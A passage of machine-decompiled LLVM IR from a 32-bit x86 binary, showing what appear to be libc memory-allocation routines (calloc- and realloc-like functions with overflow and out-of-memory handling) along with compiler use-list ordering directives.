  store i32 %v1_8050afb, i32* %v2_8050ae4, align 4
  %v0_8050b07.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050b07

dec_label_pc_8050b07:                             ; preds = %dec_label_pc_8050798, %dec_label_pc_8050af0
  %v0_8050b07 = phi i32 [ %v5_80507ab, %dec_label_pc_8050798 ], [ %v0_8050b07.pre, %dec_label_pc_8050af0 ]
  %v1_8050b07 = or i32 %v0_8050b07, 1
  store i32 %v1_8050b07, i32* %ecx.global-to-local, align 4
  %v0_8050b0a = load i32, i32* @ebx, align 4
  %v1_8050b0a = add i32 %v0_8050b0a, 8
  store i32 %v1_8050b0a, i32* %ebx.global-to-local, align 4
  %v1_8050b0d = load i32, i32* @edx, align 4
  %v2_8050b0d = add i32 %v1_8050b0d, 4
  %v3_8050b0d = inttoptr i32 %v2_8050b0d to i32*
  store i32 %v1_8050b07, i32* %v3_8050b0d, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_8050b12:                             ; preds = %dec_label_pc_8050552
  %v5_8050b18 = sub i32 %v1_8050535, %.v1_8050473
  store i32 %v5_8050b18, i32* %eax.global-to-local, align 4
  %v2_8050b1c = add i32 %v1_8050b29, %.v1_8050473
  store i32 %v2_8050b1c, i32* @edx, align 4
  %v1_8050b20 = or i32 %.v1_8050473, 1
  store i32 %v2_8050b1c, i32* @global_var_8053350.34, align 16
  store i32 %v1_8050b20, i32* %v2_805052f, align 4
  %v0_8050b2c = load i32, i32* %eax.global-to-local, align 4
  %v0_8050b2e = load i32, i32* @edx, align 4
  store i32 %v0_8050b2e, i32* @global_var_805335c.51, align 4
  %v1_8050b34 = or i32 %v0_8050b2c, 1
  store i32 %v1_8050b34, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050b2e, i32* @global_var_8053360.36, align 32
  %v1_8050b3d = add i32 %v0_8050b2e, 8
  %v2_8050b3d = inttoptr i32 %v1_8050b3d to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_8050b3d, align 4
  %v0_8050b44 = load i32, i32* @edx, align 4
  %v1_8050b44 = add i32 %v0_8050b44, 12
  %v2_8050b44 = inttoptr i32 %v1_8050b44 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_8050b44, align 4
  %v0_8050b4b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b4b = load i32, i32* @edx, align 4
  %v2_8050b4b = add i32 %v1_8050b4b, 4
  %v3_8050b4b = inttoptr i32 %v2_8050b4b to i32*
  store i32 %v0_8050b4b, i32* %v3_8050b4b, align 4
  %v0_8050b4e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b4e = load i32, i32* @edx, align 4
  %v3_8050b4e = add i32 %v1_8050b4e, %v0_8050b4e
  %v4_8050b4e = inttoptr i32 %v3_8050b4e to i32*
  store i32 %v0_8050b4e, i32* %v4_8050b4e, align 4
  br label %dec_label_pc_8050b5c

dec_label_pc_8050b53:                             ; preds = %dec_label_pc_8050561
  store i32 %.v1_8050473, i32* %ebx.global-to-local, align 4
  %v0_8050b57 = load i32, i32* @ebp, align 4
  %v2_8050b57 = or i32 %.v1_8050473, 4
  %v3_8050b57 = add i32 %v0_8050b57, %v2_8050b57
  %v4_8050b57 = inttoptr i32 %v3_8050b57 to i32*
  %v5_8050b57 = load i32, i32* %v4_8050b57, align 4
  %v6_8050b57 = or i32 %v5_8050b57, 1
  store i32 %v6_8050b57, i32* %v4_8050b57, align 4
  br label %dec_label_pc_8050b5c

dec_label_pc_8050b5c:                             ; preds = %dec_label_pc_8050b12, %dec_label_pc_8050b53
  %v0_8050b5c = load i32, i32* @ebp, align 4
  %v1_8050b5c = add i32 %v0_8050b5c, 8
  store i32 %v1_8050b5c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_8050b61:                             ; preds = %dec_label_pc_8050651
  %v1_8050b61 = load i32, i32* @ebx, align 4
  %v2_8050b61 = add i32 %v0_8050660, 4
  %v3_8050b61 = add i32 %v2_8050b61, %v1_8050b61
  %v4_8050b61 = inttoptr i32 %v3_8050b61 to i32*
  %v5_8050b61 = load i32, i32* %v4_8050b61, align 4
  %v6_8050b61 = or i32 %v5_8050b61, 1
  store i32 %v6_8050b61, i32* %v4_8050b61, align 4
  br label %dec_label_pc_8050b66

dec_label_pc_8050b66:                             ; preds = %dec_label_pc_8050669, %dec_label_pc_8050b61
  %v0_8050b66 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050b66, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_8050b6a:                             ; preds = %dec_label_pc_8050928, %dec_label_pc_8050ade, %dec_label_pc_8050932
  %v0_8050b6a = load i32, i32* %stack_var_-92, align 4
  %v1_8050b6a = call i32 @function_804ffeb(i32 %v0_8050b6a)
  store i32 %v1_8050b6a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050b71 = inttoptr i32 %v1_8050b6a to i32*
  store i32 12, i32* %v1_8050b71, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_8050b77:                             ; preds = %dec_label_pc_8050b66, %dec_label_pc_8050b5c, %dec_label_pc_8050b07, %dec_label_pc_80507c3, %dec_label_pc_8050775, %dec_label_pc_80504fc, %dec_label_pc_8050b6a
  store i32 %v2_8050433, i32* @eax, align 4
  store i32 %v2_8050433, i32* %stack_var_-92, align 4
  %v2_8050b80 = call i32 @function_805194a(i32 %v2_8050433, i32 1)
  store i32 %v2_8050b80, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b88

dec_label_pc_8050b88:                             ; preds = %dec_label_pc_8050451, %dec_label_pc_8050b77
  %v0_8050b8b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050b8b, i32* %eax.global-to-local, align 4
  %v2_8050b8d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050b8d, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050420, i32* @esi, align 4
  store i32 %v0_805041f, i32* @edi, align 4
  store i32 %v0_805041e, i32* @ebp, align 4
  ret i32 %v0_8050b8b

; uselistorder directives
  uselistorder i32 %v0_8050b4e, { 1, 0 }
  uselistorder i32 %v0_8050b2e, { 1, 0, 2 }
  uselistorder i32 %v2_8050acb, { 1, 0, 2 }
  uselistorder i32 %v0_8050ab9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050a50, { 1, 0 }
  uselistorder i32 %v2_8050a3e, { 1, 0 }
  uselistorder i32 %v1_80509f5, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80509df, { 1, 0, 2 }
  uselistorder i32 %v2_80509d3, { 1, 2, 0 }
  uselistorder i32 %v2_80509ce, { 1, 0, 2 }
  uselistorder i32 %v1_80509be, { 2, 1, 0 }
  uselistorder i8 %v0_805098c, { 1, 0, 2 }
  uselistorder i1 %v10_8050975, { 1, 0 }
  uselistorder i32 %v2_805096f, { 1, 0, 2 }
  uselistorder i32 %v0_8050a31100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8050969, { 2, 1, 0 }
  uselistorder i32 %v8_805093f, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_805093c, { 1, 0 }
  uselistorder i32 %v0_805091b, { 1, 0 }
  uselistorder i32 %v2_80508ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80508e4, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80508d1, { 1, 0 }
  uselistorder i1 %v2_80508c8, { 2, 1, 0 }
  uselistorder i32 %v1_80508c8, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80508b5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8050899, { 1, 0, 2 }
  uselistorder i32 %v2_8050885, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805084e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050842, { 2, 1, 0 }
  uselistorder i32 %v8_8050831, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8050818, { 1, 0, 2 }
  uselistorder i32 %v0_80507b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8050787, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805077d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805076f, { 1, 0 }
  uselistorder i32 %v1_8050706, { 1, 0 }
  uselistorder i32 %v3_80506fa, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_805070a, { 1, 0 }
  uselistorder i32 %v2_80506f4, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80506f17, { 1, 0 }
  uselistorder i32 %v2_80506e6, { 1, 0 }
  uselistorder i32 %v1_80506ca, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80506c6, { 2, 1, 0 }
  uselistorder i32 %v1_80506c2, { 1, 0 }
  uselistorder i32 %v1_80506b6, { 2, 1, 0 }
  uselistorder i32 %v2_80506ac, { 1, 0 }
  uselistorder i32 %v1_80506a9, { 1, 2, 0 }
  uselistorder i32 %v4_8050647, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8050692, { 1, 0 }
  uselistorder i32 %v0_8050660, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050633, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050600, { 0, 2, 1 }
  uselistorder i32 %v2_80505e4, { 1, 0 }
  uselistorder i32 %v1_80505da, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80505d5.lcssa, { 1, 0 }
  uselistorder i32 %v3_80505c5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80505bc, { 1, 0, 2 }
  uselistorder i32 %v2_8050598, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050580, { 2, 1, 0 }
  uselistorder i32 %v0_805056c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8050532, { 1, 0, 2 }
  uselistorder i32 %v1_8050b29, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80506009, { 1, 0, 2 }
  uselistorder i32 %v3_80504df, { 1, 0, 2 }
  uselistorder i32 %v2_80504d1, { 2, 1, 0 }
  uselistorder i1 %v6_80504cb, { 1, 0, 2 }
  uselistorder i32 %v2_80504ac, { 2, 1, 0 }
  uselistorder i8 %v0_805047a, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_8050473, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_8050463, { 0, 2, 1 }
  uselistorder i32 %v0_805044c, { 1, 0 }
  uselistorder i32 %v2_8050433, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 1, 20, 2, 3, 4, 5, 6, 7, 8, 9, 24, 10, 25, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8053680.48, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051c60, { 1, 0 }
  uselistorder i32 134558548, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8053360.36, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_80503f8, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805334c.33 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805334c.33 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8050b88, { 1, 0 }
  uselistorder label %dec_label_pc_8050b77, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050b6a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050b66, { 1, 0 }
  uselistorder label %dec_label_pc_8050b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8050b07, { 1, 0 }
  uselistorder label %dec_label_pc_8050ade, { 1, 0 }
  uselistorder label %dec_label_pc_8050acb, { 1, 0 }
  uselistorder label %dec_label_pc_8050ab9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050a4b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050a46, { 1, 0 }
  uselistorder label %dec_label_pc_80509d3, { 1, 0 }
  uselistorder label %dec_label_pc_80509bc, { 1, 0 }
  uselistorder label %dec_label_pc_80509a5, { 1, 0 }
  uselistorder label %dec_label_pc_8050928, { 1, 0 }
  uselistorder label %dec_label_pc_805091b, { 1, 0 }
  uselistorder label %dec_label_pc_80508dc, { 1, 0 }
  uselistorder label %dec_label_pc_80508b5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050899, { 1, 0 }
  uselistorder label %dec_label_pc_8050880, { 1, 0 }
  uselistorder label %dec_label_pc_8050862, { 1, 0 }
  uselistorder label %dec_label_pc_805077d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050775, { 1, 0 }
  uselistorder label %dec_label_pc_805075e, { 1, 0 }
  uselistorder label %dec_label_pc_80506f1, { 1, 0 }
  uselistorder label %dec_label_pc_80506f6.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80506ca, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050651, { 1, 0 }
  uselistorder label %dec_label_pc_8050600, { 1, 0 }
  uselistorder label %dec_label_pc_80505d8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80505c1, { 1, 0 }
  uselistorder label %dec_label_pc_805052f, { 1, 0 }
  uselistorder label %dec_label_pc_8050600.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80504fc, { 1, 0, 3, 2 }
}

define i32 @function_8050b92(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b92:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8050b92 = load i32, i32* @edi, align 4
  %v0_8050b94 = load i32, i32* @ebx, align 4
  %v12_8050b95 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8050b98 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_8050ba2 = sdiv i64 %sext, 4294967296
  %v3_8050ba2 = sext i32 %arg2 to i64
  %v4_8050ba2 = mul nsw i64 %v3_8050ba2, %v2_8050ba2
  %v5_8050ba2 = trunc i64 %v4_8050ba2 to i32
  store i32 %v5_8050ba2, i32* @ebx, align 4
  %v2_8050ba5 = icmp eq i32 %v4_8050b98, 0
  br i1 %v2_8050ba5, label %dec_label_pc_8050bc7, label %dec_label_pc_8050ba9

dec_label_pc_8050ba9:                             ; preds = %dec_label_pc_8050b92
  store i32 %v4_8050b98, i32* @edi, align 4
  %div = udiv i32 %v5_8050ba2, %v4_8050b98
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8050bb1 = icmp eq i32 %div, %arg2
  br i1 %v12_8050bb1, label %dec_label_pc_8050bc7, label %dec_label_pc_8050bb5

dec_label_pc_8050bb5:                             ; preds = %dec_label_pc_8050ba9
  %v1_8050bb5 = call i32 @function_804ffeb(i32 %v0_8050b94)
  store i32 %v1_8050bb5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050bbc = inttoptr i32 %v1_8050bb5 to i32*
  store i32 12, i32* %v1_8050bbc, align 4
  br label %dec_label_pc_8050c7d

dec_label_pc_8050bc7:                             ; preds = %dec_label_pc_8050ba9, %dec_label_pc_8050b92
  store i32 %v12_8050b95, i32* @eax, align 4
  %v2_8050bd7 = call i32 @function_805194a(i32 %v12_8050b95, i32 134551879)
  store i32 %v2_8050bd7, i32* %eax.global-to-local, align 4
  %v1_8050be3 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_8050be3, i32* %eax.global-to-local, align 4
  %v0_8050be8 = load i32, i32* @ebx, align 4
  %v1_8050beb = call i32 @function_805041e(i32 %v0_8050be8)
  store i32 %v1_8050beb, i32* %eax.global-to-local, align 4
  store i32 %v1_8050beb, i32* %ebx.global-to-local, align 4
  %v1_8050bf5 = icmp eq i32 %v1_8050beb, 0
  br i1 %v1_8050bf5, label %dec_label_pc_8050c6c, label %dec_label_pc_8050bf9

dec_label_pc_8050bf9:                             ; preds = %dec_label_pc_8050bc7
  %v1_8050bf9 = add i32 %v1_8050beb, -4
  %v2_8050bf9 = inttoptr i32 %v1_8050bf9 to i32*
  %v3_8050bf9 = load i32, i32* %v2_8050bf9, align 4
  store i32 %v3_8050bf9, i32* %eax.global-to-local, align 4
  %v2_8050bfc = and i32 %v3_8050bf9, 2
  %v3_8050bfc = icmp eq i32 %v2_8050bfc, 0
  %v1_8050bfe = icmp eq i1 %v3_8050bfc, false
  br i1 %v1_8050bfe, label %dec_label_pc_8050c6c, label %dec_label_pc_8050c00

dec_label_pc_8050c00:                             ; preds = %dec_label_pc_8050bf9
  %v1_8050c003 = add i32 %v3_8050bf9, -4
  %v1_8050c03 = and i32 %v1_8050c003, -4
  %v2_8050c08 = udiv i32 %v1_8050c03, 4
  store i32 %v2_8050c08, i32* %eax.global-to-local, align 4
  %v5_8050c0b = icmp ult i32 %v1_8050c03, 36
  %tmp = and i32 %v1_8050c003, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8050c0e = or i1 %v5_8050c0b, %tmp18
  br i1 %v2_8050c0e, label %dec_label_pc_8050c1f, label %dec_label_pc_8050c10

dec_label_pc_8050c10:                             ; preds = %dec_label_pc_8050c00
  %v3_8050c15 = inttoptr i32 %v1_8050beb to i8*
  %v4_8050c15 = call i32 @function_805003c(i8* %v3_8050c15, i32 0, i32 %v1_8050c03)
  store i32 %v4_8050c15, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c6c

dec_label_pc_8050c1f:                             ; preds = %dec_label_pc_8050c00
  %v1_8050c1f = inttoptr i32 %v1_8050beb to i32*
  store i32 0, i32* %v1_8050c1f, align 4
  %v0_8050c25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c25 = add i32 %v0_8050c25, 4
  %v2_8050c25 = inttoptr i32 %v1_8050c25 to i32*
  store i32 0, i32* %v2_8050c25, align 4
  %v0_8050c2c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c2c = add i32 %v0_8050c2c, 8
  %v2_8050c2c = inttoptr i32 %v1_8050c2c to i32*
  store i32 0, i32* %v2_8050c2c, align 4
  %v0_8050c33 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8050c33, 5
  br i1 %tmp15, label %dec_label_pc_8050c6c, label %dec_label_pc_8050c38

dec_label_pc_8050c38:                             ; preds = %dec_label_pc_8050c1f
  %v0_8050c38 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c38 = add i32 %v0_8050c38, 12
  %v2_8050c38 = inttoptr i32 %v1_8050c38 to i32*
  store i32 0, i32* %v2_8050c38, align 4
  %v0_8050c3f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c3f = add i32 %v0_8050c3f, 16
  %v2_8050c3f = inttoptr i32 %v1_8050c3f to i32*
  store i32 0, i32* %v2_8050c3f, align 4
  %v0_8050c46 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8050c46, 7
  br i1 %tmp16, label %dec_label_pc_8050c6c, label %dec_label_pc_8050c4b

dec_label_pc_8050c4b:                             ; preds = %dec_label_pc_8050c38
  %v0_8050c4b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c4b = add i32 %v0_8050c4b, 20
  %v2_8050c4b = inttoptr i32 %v1_8050c4b to i32*
  store i32 0, i32* %v2_8050c4b, align 4
  %v0_8050c52 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c52 = add i32 %v0_8050c52, 24
  %v2_8050c52 = inttoptr i32 %v1_8050c52 to i32*
  store i32 0, i32* %v2_8050c52, align 4
  %v0_8050c59 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8050c59, 9
  br i1 %tmp17, label %dec_label_pc_8050c6c, label %dec_label_pc_8050c5e

dec_label_pc_8050c5e:                             ; preds = %dec_label_pc_8050c4b
  %v0_8050c5e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c5e = add i32 %v0_8050c5e, 28
  %v2_8050c5e = inttoptr i32 %v1_8050c5e to i32*
  store i32 0, i32* %v2_8050c5e, align 4
  %v0_8050c65 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c65 = add i32 %v0_8050c65, 32
  %v2_8050c65 = inttoptr i32 %v1_8050c65 to i32*
  store i32 0, i32* %v2_8050c65, align 4
  br label %dec_label_pc_8050c6c

dec_label_pc_8050c6c:                             ; preds = %dec_label_pc_8050c4b, %dec_label_pc_8050c38, %dec_label_pc_8050c1f, %dec_label_pc_8050bf9, %dec_label_pc_8050bc7, %dec_label_pc_8050c10, %dec_label_pc_8050c5e
  store i32 %v12_8050b95, i32* @eax, align 4
  %v2_8050c75 = call i32 @function_805194a(i32 %v12_8050b95, i32 1)
  store i32 %v2_8050c75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c7d

dec_label_pc_8050c7d:                             ; preds = %dec_label_pc_8050bb5, %dec_label_pc_8050c6c
  %v0_8050c80 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050c80, i32* %eax.global-to-local, align 4
  store i32 %v0_8050b94, i32* @ebx, align 4
  store i32 %v0_8050b92, i32* @edi, align 4
  ret i32 %v0_8050c80

; uselistorder directives
  uselistorder i32 %v1_8050c03, { 2, 1, 0 }
  uselistorder i32 %v1_8050beb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c7d, { 1, 0 }
  uselistorder label %dec_label_pc_8050c6c, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8050c86(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050c86:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050c89 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8050c91 = icmp eq i32* %arg1, null
  %v1_8050c96 = icmp eq i1 %v4_8050c91, false
  br i1 %v1_8050c96, label %dec_label_pc_8050ca8, label %dec_label_pc_8050c98

dec_label_pc_8050c98:                             ; preds = %dec_label_pc_8050c86
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8050c9c = call i32 @function_805041e(i32 %arg2)
  store i32 %v1_8050c9c, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c9c, i32* @ebx, align 4
  br label %dec_label_pc_8050fa1

dec_label_pc_8050ca8:                             ; preds = %dec_label_pc_8050c86
  %v1_8050ca8 = icmp eq i32 %arg2, 0
  %v1_8050caa = icmp eq i1 %v1_8050ca8, false
  br i1 %v1_8050caa, label %dec_label_pc_8050cbd, label %dec_label_pc_8050cac

dec_label_pc_8050cac:                             ; preds = %dec_label_pc_8050ca8
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050cb3 = call i32 @function_80511e3(i32 %tmp7)
  store i32 %v1_8050cb3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fa1

dec_label_pc_8050cbd:                             ; preds = %dec_label_pc_8050ca8
  %v2_8050cc8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050cc8, i32* @eax, align 4
  store i32 %v2_8050cc8, i32* %stack_var_-60, align 4
  %v2_8050ccd = call i32 @function_805194a(i32 %v2_8050cc8, i32 134551879)
  store i32 %v2_8050ccd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.31 to i32), i32* %stack_var_-60, align 4
  %v1_8050cd9 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_8050cd9, i32* %eax.global-to-local, align 4
  %v0_8050ce1 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050ce1, -32
  br i1 %tmp21, label %dec_label_pc_8050cf8, label %dec_label_pc_8050ce6

dec_label_pc_8050ce6:                             ; preds = %dec_label_pc_8050cbd
  %v0_8050ce6 = load i32, i32* %stack_var_-60, align 4
  %v1_8050ce6 = call i32 @function_804ffeb(i32 %v0_8050ce6)
  store i32 %v1_8050ce6, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050ced = inttoptr i32 %v1_8050ce6 to i32*
  store i32 12, i32* %v1_8050ced, align 4
  br label %dec_label_pc_8050fa4

dec_label_pc_8050cf8:                             ; preds = %dec_label_pc_8050cbd
  %v1_8050cf8 = add i32 %v0_8050ce1, 11
  %tmp22 = icmp ult i32 %v1_8050cf8, 16
  %v1_8050d08 = and i32 %v1_8050cf8, -8
  %v1_8050cf8.v1_8050d08 = select i1 %tmp22, i32 %v1_8050cf8, i32 %v1_8050d08
  %.v1_8050d08 = select i1 %tmp22, i32 16, i32 %v1_8050d08
  store i32 %v1_8050cf8.v1_8050d08, i32* %eax.global-to-local, align 4
  %v1_8050d13 = add i32 %tmp7, -8
  store i32 %v1_8050d13, i32* @edi, align 4
  %v1_8050d16 = add i32 %tmp7, -4
  %v2_8050d16 = inttoptr i32 %v1_8050d16 to i32*
  %v3_8050d16 = load i32, i32* %v2_8050d16, align 4
  store i32 %v3_8050d16, i32* %edx.global-to-local, align 4
  %v1_8050d1b = and i32 %v3_8050d16, -4
  store i32 %v1_8050d1b, i32* %eax.global-to-local, align 4
  %v2_8050d22 = and i32 %v3_8050d16, 2
  %v3_8050d22 = icmp eq i32 %v2_8050d22, 0
  %v1_8050d25 = icmp eq i1 %v3_8050d22, false
  br i1 %v1_8050d25, label %dec_label_pc_8050ebf, label %dec_label_pc_8050d2b

dec_label_pc_8050d2b:                             ; preds = %dec_label_pc_8050cf8
  store i32 %.v1_8050d08, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050d1b, i32* @ebx, align 4
  %v7_8050d31 = icmp ult i32 %v1_8050d1b, %.v1_8050d08
  %v1_8050d33 = icmp eq i1 %v7_8050d31, false
  br i1 %v1_8050d33, label %dec_label_pc_8050e6a, label %dec_label_pc_8050d39

dec_label_pc_8050d39:                             ; preds = %dec_label_pc_8050d2b
  %v2_8050d39 = add i32 %v1_8050d1b, %v1_8050d13
  store i32 %v2_8050d39, i32* @esi, align 4
  %v1_8050d3c = load i32, i32* @global_var_805334c.33, align 4
  %v12_8050d3c = icmp eq i32 %v2_8050d39, %v1_8050d3c
  %v1_8050d42 = icmp eq i1 %v12_8050d3c, false
  %v1_8050d7c = add i32 %v2_8050d39, 4
  %v2_8050d7c = inttoptr i32 %v1_8050d7c to i32*
  %v3_8050d7c = load i32, i32* %v2_8050d7c, align 4
  br i1 %v1_8050d42, label %dec_label_pc_8050d7c, label %dec_label_pc_8050d44

dec_label_pc_8050d44:                             ; preds = %dec_label_pc_8050d39
  %v1_8050d49 = and i32 %v3_8050d7c, -4
  %v2_8050d4c = add i32 %v1_8050d49, %v1_8050d1b
  store i32 %v2_8050d4c, i32* %ecx.global-to-local, align 4
  %v1_8050d52 = add i32 %.v1_8050d08, 16
  store i32 %v1_8050d52, i32* %eax.global-to-local, align 4
  %v7_8050d55 = icmp ult i32 %v2_8050d4c, %v1_8050d52
  br i1 %v7_8050d55, label %dec_label_pc_8050dba, label %dec_label_pc_8050d59

dec_label_pc_8050d59:                             ; preds = %dec_label_pc_8050d44
  %v1_8050d59 = urem i32 %v3_8050d16, 2
  %v5_8050d5c = or i32 %v1_8050d59, %.v1_8050d08
  store i32 %v5_8050d5c, i32* %edx.global-to-local, align 4
  store i32 %v5_8050d5c, i32* %v2_8050d16, align 4
  %v0_8050d67 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050d67 = sub i32 %v0_8050d67, %.v1_8050d08
  %v0_8050d69 = load i32, i32* @edi, align 4
